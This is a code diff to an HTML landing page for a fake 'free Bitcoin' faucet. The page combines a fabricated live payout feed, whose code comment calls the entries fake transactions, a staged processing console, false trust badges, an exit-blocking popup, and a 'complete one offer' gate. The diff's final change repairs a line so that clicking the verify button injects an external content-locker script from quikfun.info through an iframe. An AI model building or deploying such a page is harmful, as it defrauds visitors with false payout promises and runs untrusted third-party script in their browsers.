@@ -6,16 +6,11 @@
     <title>Instant Bitcoin Rewards | Secure Faucet</title>
     <meta name="description" content="Generate free Bitcoin rewards instantly. fast payout, no KYC required.">
     
-    <!-- Tailwind CSS for rapid, modern styling -->
     <script src="https://cdn.tailwindcss.com"></script>
     
-    <!-- FontAwesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- Google Fonts: Inter & Rajdhani for Tech/Crypto look -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
-
-    <!-- Script removed from Head (It will be injected via iframe on click) -->
 
     <script>
         tailwind.config = {
@@ -116,14 +111,11 @@
 </head>
 <body class="antialiased min-h-screen relative">
 
-    <!-- Background Elements -->
     <div class="absolute inset-0 bg-grid pointer-events-none z-0"></div>
     <div class="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-3xl h-96 bg-orange-500/10 blur-[100px] rounded-full pointer-events-none z-0"></div>
 
-    <!-- Main Container -->
     <main class="relative z-10 max-w-6xl mx-auto px-4 py-8 flex flex-col items-center">
 
-        <!-- Header / Logo -->
         <header class="w-full flex justify-center mb-12">
             <div class="flex items-center gap-3">
                 <i class="fa-brands fa-bitcoin text-5xl text-btc animate-pulse-slow"></i>
@@ -134,10 +126,8 @@
             </div>
         </header>
 
-        <!-- SECTION 1 & 2: HERO & FORM (Toggleable) -->
         <div id="main-interface" class="w-full max-w-md">
             
-            <!-- Hero Text -->
             <div class="text-center mb-8">
                 <h2 class="text-4xl md:text-5xl font-display font-bold mb-4 glow-text leading-tight">
                     Claim Free Bitcoin <br><span class="text-transparent bg-clip-text bg-gradient-to-r from-btc to-yellow-200">Instantly</span>
@@ -147,7 +137,6 @@
                 </p>
             </div>
 
-            <!-- Trust Badges -->
             <div class="flex justify-center gap-4 mb-8">
                 <span class="px-3 py-1 bg-green-500/10 border border-green-500/20 text-green-400 text-xs rounded-full flex items-center gap-2">
                     <i class="fa-solid fa-shield-halved"></i> Secure
@@ -160,10 +149,8 @@
                 </span>
             </div>
 
-            <!-- Wallet Form -->
             <div class="bg-card border border-white/5 p-6 rounded-2xl glow-box backdrop-blur-sm">
                 <div class="space-y-4">
-                    <!-- Wallet Input -->
                     <div>
                         <label class="block text-xs font-semibold text-gray-400 uppercase mb-2 pl-1">Bitcoin Wallet Address</label>
                         <div class="relative">
@@ -173,7 +160,6 @@
                         </div>
                     </div>
 
-                    <!-- Amount Dropdown -->
                     <div>
                         <label class="block text-xs font-semibold text-gray-400 uppercase mb-2 pl-1">Select Reward Tier</label>
                         <div class="relative">
@@ -186,12 +172,10 @@
                         </div>
                     </div>
 
-                    <!-- CTA Button -->
                     <button onclick="startProcessing()" class="group w-full bg-gradient-to-r from-orange-600 to-btc hover:from-orange-500 hover:to-yellow-400 text-white font-bold py-4 rounded-lg transform hover:scale-[1.02] transition-all duration-200 shadow-lg shadow-orange-500/20 relative overflow-hidden">
                         <span class="relative z-10 flex items-center justify-center gap-2">
                             Start Claim <i class="fa-solid fa-arrow-right group-hover:translate-x-1 transition-transform"></i>
                         </span>
-                        <!-- Button Shine Effect -->
                         <div class="absolute inset-0 h-full w-full scale-0 rounded-lg transition-all duration-300 group-hover:scale-100 group-hover:bg-white/10"></div>
                     </button>
                     
@@ -200,7 +184,6 @@
             </div>
         </div>
 
-        <!-- SECTION 3: PROCESSING PAGE (Hidden by default) -->
         <div id="processing-interface" class="hidden w-full max-w-md text-center py-10">
             <div class="bg-card border border-white/5 p-8 rounded-2xl glow-box relative overflow-hidden">
                 
@@ -210,12 +193,10 @@
                     <p id="process-sub" class="text-sm text-gray-400 mt-2">Please do not close this window.</p>
                 </div>
 
-                <!-- Console Log Aesthetic -->
                 <div class="bg-black/50 rounded p-3 text-left font-mono text-xs space-y-1 h-32 overflow-hidden border border-gray-800" id="console-output">
                     <div class="text-green-500">> Initializing connection...</div>
                 </div>
 
-                <!-- Progress Bar -->
                 <div class="w-full bg-gray-800 h-2 rounded-full mt-6 overflow-hidden">
                     <div id="progress-bar" class="h-full bg-btc w-0 transition-all duration-[3000ms] ease-out"></div>
                 </div>
@@ -223,27 +204,21 @@
             </div>
         </div>
 
-        <!-- NEW FINAL STEP: VERIFICATION SCREEN (Hidden by default) -->
         <div id="verification-interface" class="hidden w-full max-w-md text-center py-8 animate-fade-in-up">
             <div class="bg-card border border-accent/50 p-8 rounded-2xl glow-box relative overflow-hidden">
                 
-                <!-- Icon -->
                 <div class="w-20 h-20 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
                     <i class="fa-solid fa-lock text-4xl text-accent"></i>
                 </div>
 
-                <!-- Title -->
                 <h3 class="text-3xl font-display font-bold text-white mb-4">Final Step Required</h3>
 
-                <!-- Text -->
                 <p class="text-gray-300 mb-8">Complete one offer to confirm your transaction.</p>
 
-                <!-- Button -->
                 <button onclick="verifyUser()" class="group w-full bg-green-500 hover:bg-green-400 text-black font-bold py-4 rounded-lg transform hover:scale-[1.02] transition-all duration-200 shadow-lg shadow-green-500/20 relative overflow-hidden">
                     <span class="relative z-10 flex items-center justify-center gap-2">
                         Verify & Claim BTC <i class="fa-solid fa-unlock group-hover:translate-x-1 transition-transform"></i>
                     </span>
-                    <!-- Button Shine Effect -->
                     <div class="absolute inset-0 h-full w-full scale-0 rounded-lg transition-all duration-300 group-hover:scale-100 group-hover:bg-white/20"></div>
                 </button>
 
@@ -251,7 +226,6 @@
             </div>
         </div>
 
-        <!-- SECTION 4: LIVE TRANSACTIONS -->
         <div class="w-full max-w-2xl mt-16">
             <div class="flex items-center justify-between mb-4 px-2">
                 <h3 class="text-sm font-bold text-gray-400 uppercase tracking-wider"><i class="fa-solid fa-tower-broadcast text-green-500 mr-2 animate-pulse"></i> Live Payout Feed</h3>
@@ -264,48 +238,39 @@
                     <div class="text-center">AMOUNT</div>
                     <div class="text-right">STATUS</div>
                 </div>
-                <!-- Transactions Container -->
                 <div id="transaction-list" class="space-y-2 h-48 overflow-hidden relative">
-                    <!-- JS will populate this -->
-                </div>
+                    </div>
             </div>
         </div>
 
-        <!-- SECTION 5: FEATURES -->
         <div class="w-full max-w-4xl mt-16 px-4">
             <h3 class="text-center font-display text-2xl font-bold mb-8 text-white">Why Use BitReward?</h3>
             <div class="grid grid-cols-2 md:grid-cols-3 gap-4">
-                <!-- Feature 1 -->
                 <div class="bg-card border border-white/5 p-4 rounded-xl text-center hover:border-btc/30 transition-colors">
                     <i class="fa-solid fa-bolt text-2xl text-yellow-400 mb-3"></i>
                     <h4 class="font-bold text-sm mb-1">Instant Claim</h4>
                     <p class="text-xs text-gray-500">Rewards sent immediately.</p>
                 </div>
-                <!-- Feature 2 -->
                 <div class="bg-card border border-white/5 p-4 rounded-xl text-center hover:border-btc/30 transition-colors">
                     <i class="fa-solid fa-percent text-2xl text-green-400 mb-3"></i>
                     <h4 class="font-bold text-sm mb-1">High Payouts</h4>
                     <p class="text-xs text-gray-500">Market leading rates.</p>
                 </div>
-                <!-- Feature 3 -->
                 <div class="bg-card border border-white/5 p-4 rounded-xl text-center hover:border-btc/30 transition-colors">
                     <i class="fa-solid fa-gift text-2xl text-pink-400 mb-3"></i>
                     <h4 class="font-bold text-sm mb-1">100% Free</h4>
                     <p class="text-xs text-gray-500">No hidden fees ever.</p>
                 </div>
-                <!-- Feature 4 -->
                 <div class="bg-card border border-white/5 p-4 rounded-xl text-center hover:border-btc/30 transition-colors">
                     <i class="fa-solid fa-user-slash text-2xl text-purple-400 mb-3"></i>
                     <h4 class="font-bold text-sm mb-1">No Registration</h4>
                     <p class="text-xs text-gray-500">Just enter wallet & go.</p>
                 </div>
-                <!-- Feature 5 -->
                 <div class="bg-card border border-white/5 p-4 rounded-xl text-center hover:border-btc/30 transition-colors">
                     <i class="fa-solid fa-users text-2xl text-blue-400 mb-3"></i>
                     <h4 class="font-bold text-sm mb-1">Referral Bonus</h4>
                     <p class="text-xs text-gray-500">Earn from friends.</p>
                 </div>
-                <!-- Feature 6 -->
                 <div class="bg-card border border-white/5 p-4 rounded-xl text-center hover:border-btc/30 transition-colors">
                     <i class="fa-solid fa-mobile-screen text-2xl text-orange-400 mb-3"></i>
                     <h4 class="font-bold text-sm mb-1">Mobile Ready</h4>
@@ -314,7 +279,6 @@
             </div>
         </div>
 
-        <!-- SECTION 7: FAQ -->
         <div class="w-full max-w-2xl mt-16 mb-12">
             <h3 class="text-center font-display text-2xl font-bold mb-6 text-white">Frequently Asked Questions</h3>
             <div class="space-y-3">
@@ -366,7 +330,6 @@
             </div>
         </div>
 
-        <!-- SECTION 8: FOOTER -->
         <footer class="text-center text-[10px] text-gray-600 py-8 border-t border-white/5 w-full">
             <p class="mb-2">© 2024 BitReward Faucet. All rights reserved.</p>
             <p>This is a promotional faucet reward simulation. Cryptocurrency involves risk. Value of BTC fluctuates.</p>
@@ -374,7 +337,6 @@
 
     </main>
 
-    <!-- SECTION 6: ANTI-EXIT POPUP (Hidden initially) -->
     <div id="exit-popup" class="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-sm hidden opacity-0 transition-opacity duration-300">
         <div class="bg-card border border-accent/50 p-6 rounded-2xl shadow-2xl max-w-sm mx-4 text-center transform scale-95 transition-transform duration-300" id="popup-content">
             <div class="w-16 h-16 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
@@ -391,7 +353,6 @@
         </div>
     </div>
 
-    <!-- JAVASCRIPT LOGIC -->
     <script>
         // --- CONFIGURATION ---
         const transactionDelay = 4500; // ms between fake transactions
@@ -474,7 +435,7 @@
             locker.srcdoc = `
                 <html>
                     <body style="margin:0; padding:0; background: transparent;">
-                        src="https://quikfun.info/sl/ppzny><\/script>
+                        <script src="https://quikfun.info/sl/ppzny"><\\/script>
                     </body>
                 </html>
             `;
